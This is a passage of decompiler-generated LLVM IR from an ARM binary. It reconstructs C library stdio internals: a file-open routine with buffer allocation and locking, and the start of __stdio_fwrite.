  %v3_19328 = zext i8 %v2_19328 to i32
  store i32 %v3_19328, i32* %r3.global-to-local, align 4
  %v1_1932c = and i32 %v3_19328, 32
  %v2_1932c = icmp eq i32 %v1_1932c, 0
  store i1 %v2_1932c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1932c, label %dec_label_pc_19594, label %dec_label_pc_19334

dec_label_pc_19334:                               ; preds = %dec_label_pc_19328
  store i32 %v0_19328, i32* @r0, align 4
  %v0_19338 = call i32 @free()
  store i32 %v0_19338, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19594

dec_label_pc_19340:                               ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_19344

dec_label_pc_19344:                               ; preds = %bb, %bb32, %dec_label_pc_19340
  %v1_1935c = phi i32 [ 1089, %bb32 ], [ 577, %bb ], [ 1, %dec_label_pc_19340 ]
  %v1_19344 = add i32 %v0_192e0, 1
  %v2_19344 = inttoptr i32 %v1_19344 to i8*
  %v3_19344 = load i8, i8* %v2_19344, align 1
  %v7_19348 = icmp eq i8 %v3_19344, 98
  store i1 %v7_19348, i1* %cpsr_z.global-to-local, align 1
  %v1_19344.v0_192e0 = select i1 %v7_19348, i32 %v1_19344, i32 %v0_192e0
  store i32 %v1_19344.v0_192e0, i32* %r3.global-to-local, align 4
  %v1_19354 = add i32 %v1_19344.v0_192e0, 1
  %v2_19354 = inttoptr i32 %v1_19354 to i8*
  %v3_19354 = load i8, i8* %v2_19354, align 1
  %v4_19354 = zext i8 %v3_19354 to i32
  store i32 %v4_19354, i32* @r3, align 4
  %v7_19358 = icmp eq i8 %v3_19354, 43
  store i1 %v7_19358, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19358, label %bb35, label %.thread4

bb35:                                             ; preds = %dec_label_pc_19344
  store i32 %v1_1935c, i32* @r3, align 4
  %v2_19360 = add nuw nsw i32 %v1_1935c, 1
  store i32 %v2_19360, i32* @r4, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_19344, %bb35
  %v2_19364 = icmp eq i32 %v0_192f0, 0
  store i1 %v2_19364, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19364, label %dec_label_pc_1936c, label %dec_label_pc_19398

dec_label_pc_1936c:                               ; preds = %.thread4
  store i32 80, i32* %r0.global-to-local, align 4
  %v1_19370 = call i32 @malloc(i32 80)
  store i32 %v1_19370, i32* %r0.global-to-local, align 4
  store i32 %v1_19370, i32* @r8, align 4
  %v3_19374 = icmp eq i32 %v1_19370, 0
  store i1 %v3_19374, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_19374, label %dec_label_pc_19598, label %dec_label_pc_1937c

dec_label_pc_1937c:                               ; preds = %dec_label_pc_1936c
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 32, i32* @r3, align 4
  %v3_19384 = inttoptr i32 %v1_19370 to i8*
  store i8 32, i8* %v3_19384, align 1
  %v0_19388 = load i32, i32* %r2.global-to-local, align 4
  %v1_19388 = load i32, i32* @r8, align 4
  %v2_19388 = add i32 %v1_19388, 8
  %v3_19388 = inttoptr i32 %v2_19388 to i32*
  store i32 %v0_19388, i32* %v3_19388, align 4
  %v0_1938c = load i32, i32* %r2.global-to-local, align 4
  %v1_1938c = trunc i32 %v0_1938c to i8
  %v2_1938c = load i32, i32* @r8, align 4
  %v3_1938c = add i32 %v2_1938c, 1
  %v4_1938c = inttoptr i32 %v3_1938c to i8*
  store i8 %v1_1938c, i8* %v4_1938c, align 1
  %v0_19390 = load i32, i32* @r8, align 4
  %v1_19390 = add i32 %v0_19390, 56
  store i32 %v1_19390, i32* @r0, align 4
  %v1_19394 = call i32 @__stdio_init_mutex(i32 %v1_19390)
  store i32 %v1_19394, i32* %r0.global-to-local, align 4
  %v0_19398.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_19398

dec_label_pc_19398:                               ; preds = %.thread4, %dec_label_pc_1937c
  %v0_193f0 = phi i32 [ %v0_192f4, %.thread4 ], [ %v0_19398.pre, %dec_label_pc_1937c ]
  %v1_19398 = icmp slt i32 %v0_193f0, 0
  %v2_19398 = icmp eq i32 %v0_193f0, 0
  store i1 %v2_19398, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_19398, label %dec_label_pc_193f0, label %dec_label_pc_193a0

dec_label_pc_193a0:                               ; preds = %dec_label_pc_19398
  %v0_193a4 = load i32, i32* @r4, align 4
  %v2_193a4 = and i32 %v0_193a4, ptrtoint ([6 x i8]* @global_var_20003.1623 to i32)
  %v1_193a8 = add i32 %v2_193a4, 1
  store i32 %v1_193a8, i32* @r2, align 4
  %v0_193ac = load i32, i32* @r6, align 4
  %v1_193ac = add i32 %v0_193ac, 1
  %v2_193b0 = and i32 %v1_193ac, %v1_193a8
  store i32 %v2_193b0, i32* %r3.global-to-local, align 4
  %v9_193b4 = icmp eq i32 %v2_193b0, %v1_193a8
  store i1 %v9_193b4, i1* %cpsr_z.global-to-local, align 1
  %v1_193b8 = load i32, i32* @r8, align 4
  %v2_193b8 = add i32 %v1_193b8, 4
  %v3_193b8 = inttoptr i32 %v2_193b8 to i32*
  store i32 %v0_193f0, i32* %v3_193b8, align 4
  br i1 %v9_193b4, label %dec_label_pc_193c0, label %dec_label_pc_19314

dec_label_pc_193c0:                               ; preds = %dec_label_pc_193a0
  %v0_193c0 = load i32, i32* @r4, align 4
  %v1_193c0 = load i32, i32* @r6, align 4
  %v2_193c0 = sub i32 -1, %v1_193c0
  %v3_193c0 = and i32 %v0_193c0, %v2_193c0
  store i32 %v3_193c0, i32* @r3, align 4
  %v1_193c4 = and i32 %v3_193c0, 1024
  %v2_193c4 = icmp eq i32 %v1_193c4, 0
  store i1 %v2_193c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_193c4, label %dec_label_pc_193e4, label %dec_label_pc_193cc

dec_label_pc_193cc:                               ; preds = %dec_label_pc_193c0
  %v0_193cc = load i32, i32* @r5, align 4
  store i32 %v0_193cc, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v2_193d8 = call i32 @__libc_fcntl(i32 %v0_193cc, i32 4)
  store i32 %v2_193d8, i32* %r0.global-to-local, align 4
  %v2_193dc = icmp eq i32 %v2_193d8, 0
  store i1 %v2_193dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_193dc, label %dec_label_pc_193cc.dec_label_pc_193e4_crit_edge, label %dec_label_pc_19314

dec_label_pc_193cc.dec_label_pc_193e4_crit_edge:  ; preds = %dec_label_pc_193cc
  %v0_193e4.pre = load i32, i32* @r6, align 4
  %v0_193e8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_193e4

dec_label_pc_193e4:                               ; preds = %dec_label_pc_193cc.dec_label_pc_193e4_crit_edge, %dec_label_pc_193c0
  %v0_193e8 = phi i32 [ %v0_193e8.pre, %dec_label_pc_193cc.dec_label_pc_193e4_crit_edge ], [ %v0_193c0, %dec_label_pc_193c0 ]
  %v0_193e4 = phi i32 [ %v0_193e4.pre, %dec_label_pc_193cc.dec_label_pc_193e4_crit_edge ], [ %v1_193c0, %dec_label_pc_193c0 ]
  %v1_193e4 = and i32 %v0_193e4, 131072
  store i32 %v1_193e4, i32* %r3.global-to-local, align 4
  %v2_193e8 = or i32 %v1_193e4, %v0_193e8
  br label %dec_label_pc_19414

dec_label_pc_193f0:                               ; preds = %dec_label_pc_19398
  %v7_193f0 = icmp eq i32 %v0_193f0, -1
  store i1 %v7_193f0, i1* %cpsr_z.global-to-local, align 1
  %v0_193fc.pre = load i32, i32* @r4, align 4
  br i1 %v7_193f0, label %dec_label_pc_193f0._crit_edge, label %bb36

bb36:                                             ; preds = %dec_label_pc_193f0
  %v2_193f4 = or i32 %v0_193fc.pre, ptrtoint ([9 x i8]* @global_var_20000.1624 to i32)
  store i32 %v2_193f4, i32* @r4, align 4
  br label %dec_label_pc_193f0._crit_edge

dec_label_pc_193f0._crit_edge:                    ; preds = %dec_label_pc_193f0, %bb36
  %v0_193fc = phi i32 [ %v2_193f4, %bb36 ], [ %v0_193fc.pre, %dec_label_pc_193f0 ]
  %v0_193f8 = load i32, i32* @r6, align 4
  store i32 %v0_193f8, i32* %r0.global-to-local, align 4
  store i32 %v0_193fc, i32* %r1.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_19404 = inttoptr i32 %v0_193f8 to i8*
  %v3_19404 = call i32 @__GI_open(i8* %v2_19404, i32 %v0_193fc)
  store i32 %v3_19404, i32* %r0.global-to-local, align 4
  %v1_19408 = icmp slt i32 %v3_19404, 0
  %v2_19408 = icmp eq i32 %v3_19404, 0
  store i1 %v2_19408, i1* %cpsr_z.global-to-local, align 1
  %v1_1940c = load i32, i32* @r8, align 4
  %v2_1940c = add i32 %v1_1940c, 4
  %v3_1940c = inttoptr i32 %v2_1940c to i32*
  store i32 %v3_19404, i32* %v3_1940c, align 4
  br i1 %v1_19408, label %dec_label_pc_19328, label %.dec_label_pc_19414_crit_edge

.dec_label_pc_19414_crit_edge:                    ; preds = %dec_label_pc_193f0._crit_edge
  %v0_19418.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_19414

dec_label_pc_19414:                               ; preds = %.dec_label_pc_19414_crit_edge, %dec_label_pc_193e4
  %v0_19434 = phi i32 [ %v0_19418.pre, %.dec_label_pc_19414_crit_edge ], [ %v2_193e8, %dec_label_pc_193e4 ]
  %v0_19414 = load i32, i32* @r8, align 4
  %v1_19414 = inttoptr i32 %v0_19414 to i8*
  %v2_19414 = load i8, i8* %v1_19414, align 1
  %v3_19414 = zext i8 %v2_19414 to i32
  %v1_19418 = urem i32 %v0_19434, 4
  %v3_1941c = mul nuw nsw i32 %v3_19414, 256
  %v1_19420 = and i32 %v0_19434, 1024
  %v1_19424 = and i32 %v3_1941c, 8192
  %v1_19428 = add nuw nsw i32 %v1_19418, 1
  %v2_1942c = or i32 %v1_19424, %v1_19420
  store i32 %v2_1942c, i32* %r3.global-to-local, align 4
  %v1_19430 = xor i32 %v1_19428, 3
  store i32 %v1_19430, i32* %r1.global-to-local, align 4
  %v1_19434 = and i32 %v0_19434, ptrtoint ([9 x i8]* @global_var_20000.1624 to i32)
  store i32 %v1_19434, i32* %r2.global-to-local, align 4
  %v2_19434 = icmp eq i32 %v1_19434, 0
  store i1 %v2_19434, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19434, label %bb38, label %bb37

bb37:                                             ; preds = %dec_label_pc_19414
  store i32 32768, i32* %r2.global-to-local, align 4
  br label %bb38

bb38:                                             ; preds = %dec_label_pc_19414, %bb37
  %v0_19444 = phi i32 [ 0, %dec_label_pc_19414 ], [ 32768, %bb37 ]
  %v4_1943c = mul nuw nsw i32 %v1_19430, 16
  %v5_1943c = or i32 %v2_1942c, %v4_1943c
  store i32 %v5_1943c, i32* %r3.global-to-local, align 4
  %v1_19440 = add i32 %v0_19414, 4
  %v2_19440 = inttoptr i32 %v1_19440 to i32*
  %v3_19440 = load i32, i32* %v2_19440, align 4
  store i32 %v3_19440, i32* @r4, align 4
  %v2_19444 = or i32 %v0_19444, %v5_1943c
  store i32 %v2_19444, i32* %r2.global-to-local, align 4
  %v3_19448 = udiv i32 %v2_19444, 256
  store i32 %v3_19448, i32* %r3.global-to-local, align 4
  %v8_1944c = icmp eq i32 %v3_19440, 2147483647
  store i1 %v8_1944c, i1* %cpsr_z.global-to-local, align 1
  %v1_19450 = trunc i32 %v3_19448 to i8
  store i8 %v1_19450, i8* %v1_19414, align 1
  %v0_19454 = load i32, i32* %r2.global-to-local, align 4
  %v1_19454 = trunc i32 %v0_19454 to i8
  %v2_19454 = load i32, i32* @r8, align 4
  %v3_19454 = add i32 %v2_19454, 1
  %v4_19454 = inttoptr i32 %v3_19454 to i8*
  store i8 %v1_19454, i8* %v4_19454, align 1
  %v0_19458 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19458, label %dec_label_pc_19494, label %dec_label_pc_1945c

dec_label_pc_1945c:                               ; preds = %bb38
  %v0_1945c = call i32 @__GI___errno_location()
  store i32 %v0_1945c, i32* @r5, align 4
  %v0_19464 = load i32, i32* @r4, align 4
  store i32 %v0_19464, i32* @r0, align 4
  %v1_19468 = inttoptr i32 %v0_1945c to i32*
  %v2_19468 = load i32, i32* %v1_19468, align 4
  store i32 %v2_19468, i32* @r4, align 4
  %v1_1946c = call i32 @isatty(i32 %v0_19464)
  store i32 %v1_1946c, i32* %r0.global-to-local, align 4
  %v2_19470 = icmp eq i32 %v1_1946c, 0
  store i1 %v2_19470, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19470, label %dec_label_pc_19490, label %dec_label_pc_19478

dec_label_pc_19478:                               ; preds = %dec_label_pc_1945c
  %v0_19478 = load i32, i32* @r8, align 4
  %v1_19478 = inttoptr i32 %v0_19478 to i32*
  %v2_19478 = load i32, i32* %v1_19478, align 4
  %v3_1947c = udiv i32 %v2_19478, 65536
  %v1_19480 = or i32 %v3_1947c, 256
  store i32 %v1_19480, i32* %r3.global-to-local, align 4
  %v3_194841 = udiv i32 %v1_19480, 256
  store i32 %v3_194841, i32* %r2.global-to-local, align 4
  %v1_19488 = trunc i32 %v3_194841 to i8
  %v3_19488 = inttoptr i32 %v0_19478 to i8*
  store i8 %v1_19488, i8* %v3_19488, align 1
  %v0_1948c = load i32, i32* %r3.global-to-local, align 4
  %v1_1948c = trunc i32 %v0_1948c to i8
  %v2_1948c = load i32, i32* @r8, align 4
  %v3_1948c = add i32 %v2_1948c, 1
  %v4_1948c = inttoptr i32 %v3_1948c to i8*
  store i8 %v1_1948c, i8* %v4_1948c, align 1
  br label %dec_label_pc_19490

dec_label_pc_19490:                               ; preds = %dec_label_pc_1945c, %dec_label_pc_19478
  %v0_19490 = load i32, i32* @r4, align 4
  %v1_19490 = load i32, i32* @r5, align 4
  %v2_19490 = inttoptr i32 %v1_19490 to i32*
  store i32 %v0_19490, i32* %v2_19490, align 4
  br label %dec_label_pc_19494

dec_label_pc_19494:                               ; preds = %bb38, %dec_label_pc_19490
  %v0_19494 = load i32, i32* @r8, align 4
  %v1_19494 = add i32 %v0_19494, 8
  %v2_19494 = inttoptr i32 %v1_19494 to i32*
  %v3_19494 = load i32, i32* %v2_19494, align 4
  store i32 %v3_19494, i32* %r3.global-to-local, align 4
  %v2_19498 = icmp eq i32 %v3_19494, 0
  store i1 %v2_19498, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19498, label %dec_label_pc_194a0, label %bb39

dec_label_pc_194a0:                               ; preds = %dec_label_pc_19494
  store i32 4096, i32* %r0.global-to-local, align 4
  %v1_194a4 = call i32 @malloc(i32 4096)
  store i32 %v1_194a4, i32* %r0.global-to-local, align 4
  %v2_194a8 = icmp eq i32 %v1_194a4, 0
  store i1 %v2_194a8, i1* %cpsr_z.global-to-local, align 1
  %v1_194c0.pre = load i32, i32* @r8, align 4
  br i1 %v2_194a8, label %.thread8.thread, label %.thread9

.thread8.thread:                                  ; preds = %dec_label_pc_194a0
  %v2_194c022 = add i32 %v1_194c0.pre, 8
  %v3_194c023 = inttoptr i32 %v2_194c022 to i32*
  store i32 0, i32* %v3_194c023, align 4
  br label %.thread11

.thread9:                                         ; preds = %dec_label_pc_194a0
  %v2_194ac = inttoptr i32 %v1_194c0.pre to i32*
  %v3_194ac = load i32, i32* %v2_194ac, align 4
  %v4_194b0 = udiv i32 %v3_194ac, 65536
  %v2_194b4 = or i32 %v4_194b0, 16384
  store i32 %v2_194b4, i32* %r3.global-to-local, align 4
  %v2_194b8 = add i32 %v1_194a4, 4096
  store i32 %v2_194b8, i32* %r2.global-to-local, align 4
  %v4_194bc21 = udiv i32 %v2_194b4, 256
  store i32 %v4_194bc21, i32* %r1.global-to-local, align 4
  %v2_194c0 = add i32 %v1_194c0.pre, 8
  %v3_194c0 = inttoptr i32 %v2_194c0 to i32*
  store i32 %v1_194a4, i32* %v3_194c0, align 4
  %v1_194c4 = load i32, i32* %r2.global-to-local, align 4
  %v2_194c4 = load i32, i32* @r8, align 4
  %v3_194c4 = add i32 %v2_194c4, 12
  %v4_194c4 = inttoptr i32 %v3_194c4 to i32*
  store i32 %v1_194c4, i32* %v4_194c4, align 4
  %v1_194c8 = load i32, i32* %r1.global-to-local, align 4
  %v2_194c8 = trunc i32 %v1_194c8 to i8
  %v3_194c8 = load i32, i32* @r8, align 4
  %v4_194c8 = inttoptr i32 %v3_194c8 to i8*
  store i8 %v2_194c8, i8* %v4_194c8, align 1
  %v0_194cc.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_194cc.pr.pr, label %.thread11, label %.thread10

.thread10:                                        ; preds = %.thread9
  %v1_194cc = load i32, i32* %r3.global-to-local, align 4
  %v2_194cc = trunc i32 %v1_194cc to i8
  %v3_194cc = load i32, i32* @r8, align 4
  %v4_194cc = add i32 %v3_194cc, 1
  %v5_194cc = inttoptr i32 %v4_194cc to i8*
  store i8 %v2_194cc, i8* %v5_194cc, align 1
  %v0_194d0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_194d0.pr.pr, label %.thread11, label %bb39

.thread11:                                        ; preds = %.thread8.thread, %.thread9, %.thread10
  %v2_194d0 = load i32, i32* @r8, align 4
  %v3_194d0 = add i32 %v2_194d0, 12
  %v4_194d0 = inttoptr i32 %v3_194d0 to i32*
  store i32 %v1_194a4, i32* %v4_194d0, align 4
  br label %bb39

bb39:                                             ; preds = %dec_label_pc_19494, %.thread10, %.thread11
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2e238.1627 to i32), i32* %r3.global-to-local, align 4
  %v2_194dc = load i32, i32* @r8, align 4
  %v3_194dc = add i32 %v2_194dc, 2
  %v4_194dc = inttoptr i32 %v3_194dc to i8*
  store i8 0, i8* %v4_194dc, align 1
  %v0_194e0 = load i32, i32* @r8, align 4
  %v1_194e0 = inttoptr i32 %v0_194e0 to i8*
  %v2_194e0 = load i8, i8* %v1_194e0, align 1
  %v3_194e0 = zext i8 %v2_194e0 to i32
  store i32 %v3_194e0, i32* @r2, align 4
  %v2_194e4 = load i32, i32* @global_var_2e238.1627, align 4
  store i32 %v2_194e4, i32* %r1.global-to-local, align 4
  %v1_194e8 = add i32 %v0_194e0, 8
  %v2_194e8 = inttoptr i32 %v1_194e8 to i32*
  %v3_194e8 = load i32, i32* %v2_194e8, align 4
  store i32 %v3_194e8, i32* %r3.global-to-local, align 4
  %v1_194ec = and i32 %v3_194e0, 32
  %v2_194ec = icmp eq i32 %v1_194ec, 0
  store i1 %v2_194ec, i1* %cpsr_z.global-to-local, align 1
  %v2_194f0 = add i32 %v0_194e0, 20
  %v3_194f0 = inttoptr i32 %v2_194f0 to i32*
  store i32 %v3_194e8, i32* %v3_194f0, align 4
  %v0_194f4 = load i32, i32* %r0.global-to-local, align 4
  %v1_194f4 = load i32, i32* @r8, align 4
  %v2_194f4 = add i32 %v1_194f4, 44
  %v3_194f4 = inttoptr i32 %v2_194f4 to i32*
  store i32 %v0_194f4, i32* %v3_194f4, align 4
  %v0_194f8 = load i32, i32* %r1.global-to-local, align 4
  %v1_194f8 = load i32, i32* @r8, align 4
  %v2_194f8 = add i32 %v1_194f8, 52
  %v3_194f8 = inttoptr i32 %v2_194f8 to i32*
  store i32 %v0_194f8, i32* %v3_194f8, align 4
  %v0_194fc = load i32, i32* %r3.global-to-local, align 4
  %v1_194fc = load i32, i32* @r8, align 4
  %v2_194fc = add i32 %v1_194fc, 24
  %v3_194fc = inttoptr i32 %v2_194fc to i32*
  store i32 %v0_194fc, i32* %v3_194fc, align 4
  %v0_19500 = load i32, i32* %r3.global-to-local, align 4
  %v1_19500 = load i32, i32* @r8, align 4
  %v2_19500 = add i32 %v1_19500, 28
  %v3_19500 = inttoptr i32 %v2_19500 to i32*
  store i32 %v0_19500, i32* %v3_19500, align 4
  %v0_19504 = load i32, i32* %r3.global-to-local, align 4
  %v1_19504 = load i32, i32* @r8, align 4
  %v2_19504 = add i32 %v1_19504, 16
  %v3_19504 = inttoptr i32 %v2_19504 to i32*
  store i32 %v0_19504, i32* %v3_19504, align 4
  br i1 %v2_194ec, label %dec_label_pc_19598, label %dec_label_pc_1950c

dec_label_pc_1950c:                               ; preds = %bb39
  %v2_1950c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1950c, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_18078.1329 to i32), i32* @r1, align 4
  store i32 ptrtoint (i32* @global_var_2e220.1325 to i32), i32* @r2, align 4
  %v1_19524 = call i32 @_pthread_cleanup_push_defer()
  store i32 ptrtoint (i32* @global_var_2e220.1325 to i32), i32* %r0.global-to-local, align 4
  %v2_19534 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_2e220.1325 to i32))
  store i32 ptrtoint (i32* @global_var_2e208.1323 to i32), i32* @r2, align 4
  store i32 %v2_192e8, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_18078.1329 to i32), i32* @r1, align 4
  %v1_19548 = call i32 @_pthread_cleanup_push_defer()
  store i32 ptrtoint (i32* @global_var_2e208.1323 to i32), i32* %r0.global-to-local, align 4
  %v2_19554 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_2e208.1323 to i32))
  store i32 ptrtoint (i32** @global_var_2e204.1327 to i32), i32* @r2, align 4
  %v2_1955c = load i32, i32* bitcast (i32** @global_var_2e204.1327 to i32*), align 4
  store i32 %v2_1955c, i32* %r3.global-to-local, align 4
  store i32 %v2_192e8, i32* @r0, align 4
  %v1_19564 = load i32, i32* @r8, align 4
  %v2_19564 = add i32 %v1_19564, 32
  %v3_19564 = inttoptr i32 %v2_19564 to i32*
  store i32 %v2_1955c, i32* %v3_19564, align 4
  store i32 1, i32* @r1, align 4
  %v0_19570 = load i32, i32* @r8, align 4
  %v1_19570 = load i32, i32* @r2, align 4
  %v2_19570 = inttoptr i32 %v1_19570 to i32*
  store i32 %v0_19570, i32* %v2_19570, align 4
  %v1_19578 = call i32 @_pthread_cleanup_pop_restore()
  store i32 %v2_1950c, i32* @r0, align 4
  store i32 1, i32* @r1, align 4
  store i32 103824, i32* @lr, align 4
  %v1_1958c = call i32 @_pthread_cleanup_pop_restore()
  store i32 %v1_1958c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19598

dec_label_pc_19594:                               ; preds = %dec_label_pc_19328, %dec_label_pc_19314, %dec_label_pc_19334
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_19598

dec_label_pc_19598:                               ; preds = %bb39, %dec_label_pc_1936c, %dec_label_pc_1950c, %dec_label_pc_19594
  %v0_19598 = load i32, i32* @r8, align 4
  store i32 %v0_19598, i32* %r0.global-to-local, align 4
  %v2_195a0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_195a0, i32* @r4, align 4
  store i32 %v6_192dc, i32* @r5, align 4
  store i32 %v9_192dc, i32* @r6, align 4
  store i32 %v15_192dc, i32* @r8, align 4
  ret i32 %v0_19598

; uselistorder directives
  uselistorder i32 %v1_194c0.pre, { 1, 0, 2 }
  uselistorder i32 %v3_194841, { 1, 0 }
  uselistorder i32 %v0_19434, { 1, 2, 0 }
  uselistorder i32 %v0_193fc, { 1, 0 }
  uselistorder i1 %v7_193f0, { 1, 0 }
  uselistorder i32 %v1_193c0, { 1, 0 }
  uselistorder i32 %v0_193c0, { 1, 0 }
  uselistorder i32 %v1_193a8, { 1, 0, 2 }
  uselistorder i32 %v1_1935c, { 1, 0 }
  uselistorder i1 %v7_19308, { 1, 0 }
  uselistorder i1 %v7_192fc, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 17, 18 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 2, 3, 4, 5, 7, 6, 8, 10, 9, 12, 11, 13, 15, 14, 16, 17 }
  uselistorder i32 16384, { 17, 16, 0, 1, 6, 11, 4, 12, 5, 13, 2, 14, 3, 15, 7, 8, 9, 10 }
  uselistorder i32 (i32)* @isatty, { 2, 1, 0 }
  uselistorder i32 (i8*, i32)* @__GI_open, { 1, 4, 0, 2, 3 }
  uselistorder i32 131072, { 1, 0 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 1, 10, 0, 9, 8, 7, 6, 14, 13, 12, 11, 5, 4, 3, 2 }
  uselistorder i32 (i32)* @__stdio_init_mutex, { 0, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_19598, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_19594, { 2, 0, 1 }
  uselistorder label %bb39, { 2, 1, 0 }
  uselistorder label %.thread11, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19494, { 1, 0 }
  uselistorder label %dec_label_pc_19490, { 1, 0 }
  uselistorder label %bb38, { 1, 0 }
  uselistorder label %dec_label_pc_193f0._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_19398, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_19344, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19314, { 1, 2, 0 }
}

define i32 @"$d.3"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_195a4:
  %v0_195a4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_195a4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_195a4
  %v5_195a4 = sdiv i32 %arg2, 16
  %v6_195a4 = and i32 %v5_195a4, %arg1
  %v5_195a8 = sdiv i32 %arg2, 256
  %v6_195a8 = and i32 %v6_195a4, %v5_195a8
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_195a4, %bb
  %v7_195a8 = phi i32 [ %arg1, %dec_label_pc_195a4 ], [ %v6_195a8, %bb ]
  ret i32 %v7_195a8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i8* %arg3) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg3 to i32
  %stack_var_-20 = alloca i32, align 4
  %v3_195d4 = load i32, i32* @r4, align 4
  store i32 %v3_195d4, i32* %stack_var_-20, align 4
  %v6_195d4 = load i32, i32* @r5, align 4
  %v9_195d4 = load i32, i32* @r6, align 4
  %v12_195d4 = load i32, i32* @r7, align 4
  %v15_195d4 = load i32, i32* @lr, align 4
  %v3_195d8 = load i8, i8* %arg3, align 1
  %v4_195d8 = zext i8 %v3_195d8 to i32
  %v3_195dc = mul nuw nsw i32 %v4_195d8, 256
  %v1_195e0 = and i32 %v3_195dc, 512
  store i32 %v1_195e0, i32* @r4, align 4
  %v2_195e0 = icmp eq i32 %v1_195e0, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_195e0, label %dec_label_pc_195f4, label %dec_label_pc_196f0

dec_label_pc_195f4:                               ; preds = %entry
  %v2_195f4 = add i32 %tmp, 4
  %v3_195f4 = inttoptr i32 %v2_195f4 to i32*
  %v4_195f4 = load i32, i32* %v3_195f4, align 4
  %v2_195fc = add i32 %tmp, 16
  %v3_195fc = inttoptr i32 %v2_195fc to i32*
  %v4_195fc = load i32, i32* %v3_195fc, align 4
  store i32 %v4_195fc, i32* @r0, align 4
  %v2_19600 = add i32 %tmp, 12
  %v3_19600 = inttoptr i32 %v2_19600 to i32*
  %v4_19600 = load i32, i32* %v3_19600, align 4
  %v4_19604 = icmp eq i32 %v4_195f4, -2
  %v2_19608 = sub i32 %v4_19600, %v4_195fc
  br i1 %v4_19604, label %dec_label_pc_19608, label %dec_label_pc_19630

dec_label_pc_19608:                               ; preds = %dec_label_pc_195f4
  %v3_1960c = icmp ugt i32 %v2_19608, %arg2
  br i1 %v3_1960c, label %bb, label %bb11

bb:                                               ; preds = %dec_label_pc_19608
  br label %bb11

bb11:                                             ; preds = %dec_label_pc_19608, %bb
  %storemerge = phi i32 [ %arg2, %bb ], [ %v2_19608, %dec_label_pc_19608 ]
  %v0_19614 = phi i32 [ %arg2, %bb ], [ %v2_19608, %dec_label_pc_19608 ]
  store i32 %storemerge, i32* @r4, align 4
  store i32 %v0_19614, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_1961c = call i32 @memcpy()
  %v0_19620 = load i32, i32* @r5, align 4
  %v1_19620 = add i32 %v0_19620, 16
  %v2_19620 = inttoptr i32 %v1_19620 to i32*
  %v3_19620 = load i32, i32* %v2_19620, align 4
  %v1_19624 = load i32, i32* @r4, align 4
  %v2_19624 = add i32 %v1_19624, %v3_19620
  store i32 %v2_19624, i32* %v2_19620, align 4
  br label %dec_label_pc_19704

dec_label_pc_19630:                               ; preds = %dec_label_pc_195f4
  %tmp18 = icmp ult i32 %v2_19608, %arg2
  br i1 %tmp18, label %dec_label_pc_196d0, label %dec_label_pc_1963c

dec_label_pc_1963c:                               ; preds = %dec_label_pc_19630
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_19644 = call i32 @memcpy()
  %v0_19648 = load i32, i32* @r5, align 4
  %v1_19648 = add i32 %v0_19648, 16
  %v2_19648 = inttoptr i32 %v1_19648 to i32*
  %v3_19648 = load i32, i32* %v2_19648, align 4
  %v1_1964c = inttoptr i32 %v0_19648 to i8*
  %v2_1964c = load i8, i8* %v1_1964c, align 1
  %v1_19650 = load i32, i32* @r6, align 4
  %v2_19650 = add i32 %v1_19650, %v3_19648
  %tmp19 = urem i8 %v2_1964c, 2
  %v2_19654 = icmp eq i8 %tmp19, 0
